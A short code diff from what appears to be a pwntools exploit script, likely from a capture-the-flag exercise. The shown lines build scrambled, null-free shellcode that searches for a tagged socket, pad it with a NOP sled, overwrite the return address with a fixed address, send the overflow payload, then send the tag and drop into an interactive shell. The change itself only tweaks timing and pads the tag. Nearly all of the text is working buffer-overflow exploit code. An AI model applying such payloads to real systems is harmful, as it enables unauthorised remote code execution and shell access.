@@ -16,7 +16,10 @@ shellcode = scramble(asm(findtagsh(tag)), avoid = '\x00\n')
 
 eip = p32(0x0804a080)
 sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
-time.sleep(0.1)
-sock.send(p32(tag))
-time.sleep(0.1)
+
+# This not nececary as there is no leftover garbage
+# however it is kept here as a reference
+time.sleep(0.1) 
+
+sock.send(p32(tag).ljust(127))
 sock.interactive()
